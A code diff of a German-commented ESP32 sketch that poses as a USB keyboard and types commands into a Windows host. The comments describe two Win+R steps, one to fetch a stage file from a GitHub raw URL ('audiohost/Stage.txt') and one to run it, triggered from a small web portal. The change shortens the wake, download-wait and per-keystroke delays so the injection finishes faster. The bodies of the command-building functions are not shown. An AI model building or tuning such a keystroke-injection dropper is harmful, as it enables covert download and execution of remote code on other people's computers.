@@ -33,12 +33,12 @@ static const char* STAGE_URL =
     "https://raw.githubusercontent.com/ente1231/audiohost/main/Stage.txt";
 
 // Zeitfenster. Zwei Schritte, zwei Win+R: erst holen, dann starten.
-static const uint16_t START_DELAY_MS   = 3000;       // Zeit bis Windows Tasten annimmt
-static const uint16_t WAKE_DELAY_MS    = 2600;       // Wecktaste bis Bildschirm wach ist
-static const uint16_t RUNBOX_DELAY_MS  = 900;        // bis Win+R wirklich da ist
+static const uint16_t START_DELAY_MS   = 1200;       // Zeit bis Windows Tasten annimmt
+static const uint16_t WAKE_DELAY_MS    = 1200;       // Wecktaste bis Bildschirm wach ist
+static const uint16_t RUNBOX_DELAY_MS  = 600;        // bis Win+R wirklich da ist
 static const uint16_t PORTAL_DELAY_MS  = 1200;       // nach Klick warten, bis Seite weg ist
 static const uint16_t NOTEPAD_DELAY_MS = 2200;       // bis Notepad ein Eingabefeld hat
-static const uint16_t DOWNLOAD_WAIT_MS = 8000;       // Schritt 1 fertig, bevor Schritt 2 tippt
+static const uint16_t DOWNLOAD_WAIT_MS = 3500;       // Schritt 1 fertig, bevor Schritt 2 tippt
 
 // Rohe HID-Usages. Keyboard.write(KEY_RETURN) & Co. sind auf dem ESP32-Core
 // nicht zuverlaessig: KEY_END/KEY_BACKSPACE gehen als 0xB2/0xD1 durch die
@@ -53,10 +53,10 @@ static const uint8_t KEYCODE_END       = 0x4D;
 
 // Tipptempo. 40 ms pro Taste war lesbar, aber zaeh. HID wird mit 1 ms gepollt,
 // Windows vertraegt deutlich mehr. 10 ms Tastendruck + 5 ms Satz reicht.
-static const uint16_t KEY_DOWN_MS   = 10;
-static const uint16_t CHAR_GAP_MS   = 5;
-static const uint16_t MOD_LEAD_MS   = 5;
-static const uint16_t MOD_TRAIL_MS  = 5;
+static const uint16_t KEY_DOWN_MS   = 8;
+static const uint16_t CHAR_GAP_MS   = 4;
+static const uint16_t MOD_LEAD_MS   = 4;
+static const uint16_t MOD_TRAIL_MS  = 4;
 
 static volatile uint32_t g_installAt = 0;            // millis()-Zeitpunkt, 0 = nichts geplant
 static volatile uint8_t  g_mode      = 0;            // 1 = installieren, 2 = Tastaturtest
@@ -70,6 +70,25 @@ static volatile uint32_t g_finishAt  = 0;
 // Zeichen -> HID-Usage, deutsches Layout
 // ---------------------------------------------------------------------
 struct KeyDef { uint8_t usage; bool shift; bool altgr; };
+
+// Prototypen: Arduino IDE erzeugt sie selbst, PlatformIO mit .cpp nicht.
+// Beide Wege bauen so denselben Sketch.
+static bool mapGerman(char c, KeyDef& out);
+static void tap(uint8_t usage, bool shift, bool altgr);
+static void typeChar(char c, bool de);
+static void typeString(const char* s, bool de);
+static void tapRaw(uint8_t usage);
+static void wakeHost();
+static String buildInstall();
+static String buildExecute();
+static void openRunBox();
+static void submit();
+static void runInstall();
+static void runKeyboardTest();
+static void sendPortal();
+static void handleGo();
+static void handleState();
+static void handleNotFound();
 
 static bool mapGerman(char c, KeyDef& out) {
   // Buchstaben: DE y und z liegen auf den US-Positionen von z und y
